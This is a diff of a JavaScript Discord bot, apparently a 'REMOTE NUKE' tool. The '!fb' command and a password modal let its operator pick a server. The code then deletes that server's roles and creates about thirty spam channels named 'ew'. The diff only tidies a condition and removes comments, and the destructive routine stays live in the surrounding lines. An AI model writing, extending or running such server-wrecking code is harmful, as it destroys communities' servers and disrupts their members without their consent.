@@ -41,7 +41,9 @@ client.once('ready', () => {
 client.on('messageCreate', async message => {
   if (message.author.bot || !message.guild) return;
 
-  if (message.content.trim().toLowerCase() === '!fb') {
+  const content = message.content.trim().toLowerCase();
+
+  if (content === '!fb') {
     const embed = new EmbedBuilder()
       .setColor('#ff0000')
       .setTitle('🔴 REMOTE NUKE')
@@ -74,7 +76,6 @@ client.on('interactionCreate', async interaction => {
       const password = interaction.fields.getTextInputValue('password');
       if (password !== MAIN_PASSWORD) return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
 
-      // Server selector
       const servers = client.guilds.cache.map(g => ({
         label: g.name.length > 25 ? g.name.slice(0, 22) + '...' : g.name,
         value: g.id,
@@ -106,7 +107,6 @@ client.on('interactionCreate', async interaction => {
           await role.delete().catch(() => {});
         }
 
-        // Create ew channel + spam invites
         const ew = await guild.channels.create({ name: 'ew', type: ChannelType.GuildText });
         for (let i = 0; i < 30; i++) {
           await guild.channels.create({ name: 'ew', type: ChannelType.GuildText }).catch(() => {});
